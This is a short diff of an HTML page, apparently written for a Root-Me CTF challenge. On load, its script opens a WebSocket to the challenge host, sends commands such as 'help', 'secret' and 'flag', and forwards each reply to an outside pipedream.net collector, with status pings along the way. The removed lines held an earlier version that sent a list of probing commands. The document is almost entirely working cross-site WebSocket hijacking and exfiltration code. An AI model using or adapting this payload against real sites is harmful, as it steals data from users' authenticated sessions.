@@ -2,42 +2,32 @@
 <html>
 <body>
 <script>
+fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=page_loaded", { mode: "no-cors" });
 
-fetch("https://eo287p1od7gtso3.m.pipedream.net/?test=good4");
-  
-const ws = new WebSocket("ws://ctf20.root-me.org/ws");
+setTimeout(() => {
+  const ws = new WebSocket("ws://ctf20.root-me.org/ws");
 
-const cmds = [
-  "help",
-  "commands",
-  "admin",
-  "debug",
-  "list",
-  "ls",
-  "whoami",
-  "id",
-  "file",
-  "files",
-  "get",
-  "read",
-  "show",
-  "open",
-  "secret",
-  "secrets",
-  "flag",
-  "passwd",
-  "/passwd"
-];
+  ws.onopen = () => {
+    fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_open", { mode: "no-cors" });
+    ws.send("help");
+    setTimeout(() => ws.send("secret"), 500);
+    setTimeout(() => ws.send("flag"), 1000);
+  };
 
-ws.onopen = () => {
-  cmds.forEach(c => ws.send(c));
-};
+  ws.onmessage = (e) => {
+    fetch("https://eo287p1od7gtso3.m.pipedream.net/?msg=" + encodeURIComponent(e.data), {
+      mode: "no-cors"
+    });
+  };
 
-ws.onmessage = (e) => {
-  fetch("https://eo287p1od7gtso3.m.pipedream.net/?d=" + encodeURIComponent(e.data), {
-    mode: "no-cors"
-  });
-};
+  ws.onerror = () => {
+    fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_error", { mode: "no-cors" });
+  };
+
+  ws.onclose = () => {
+    fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_close", { mode: "no-cors" });
+  };
+}, 1500);
 </script>
 OK
 </body>
